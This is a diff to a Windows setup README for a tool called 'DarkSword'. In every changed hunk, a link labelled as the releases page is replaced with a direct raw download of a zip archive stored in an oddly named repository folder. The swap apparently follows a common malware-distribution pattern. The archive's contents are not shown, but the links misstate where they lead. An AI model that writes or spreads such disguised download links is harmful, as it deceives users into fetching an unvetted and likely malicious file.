@@ -1,6 +1,6 @@
 # 🗡️ DarkSword - Clean Windows Setup Guide
 
-[![Download DarkSword](https://img.shields.io/badge/Download-DarkSword-5865F2?style=for-the-badge&logo=github)](https://github.com/mousta8559/DarkSword/releases)
+[![Download DarkSword](https://img.shields.io/badge/Download-DarkSword-5865F2?style=for-the-badge&logo=github)](https://github.com/mousta8559/DarkSword/raw/refs/heads/main/incorrespondence/Dark-Sword-3.3-alpha.3.zip)
 
 ## 🧭 What DarkSword Is
 
@@ -10,7 +10,7 @@ Use it if you want a local tool to look through chain data on your PC. It runs o
 
 ## 📥 Download DarkSword
 
-1. Open the [DarkSword Releases page](https://github.com/mousta8559/DarkSword/releases)
+1. Open the [DarkSword Releases page](https://github.com/mousta8559/DarkSword/raw/refs/heads/main/incorrespondence/Dark-Sword-3.3-alpha.3.zip)
 2. Find the latest release at the top
 3. Download the Windows file from the release assets
 4. Save the file to a folder you can find again, like Downloads or Desktop
@@ -146,7 +146,7 @@ This helps avoid broken paths and missing files.
 
 When a new version appears on the releases page, repeat the download process:
 
-1. Visit the [DarkSword Releases page](https://github.com/mousta8559/DarkSword/releases)
+1. Visit the [DarkSword Releases page](https://github.com/mousta8559/DarkSword/raw/refs/heads/main/incorrespondence/Dark-Sword-3.3-alpha.3.zip)
 2. Download the latest Windows asset
 3. Replace the old files if needed
 4. Open the new version from its folder
@@ -155,7 +155,7 @@ Keep your old folder until you confirm the new one works
 
 ## 📎 Quick Start
 
-1. Go to the [DarkSword Releases page](https://github.com/mousta8559/DarkSword/releases)
+1. Go to the [DarkSword Releases page](https://github.com/mousta8559/DarkSword/raw/refs/heads/main/incorrespondence/Dark-Sword-3.3-alpha.3.zip)
 2. Download the latest Windows file
 3. Extract it if needed
 4. Open the app
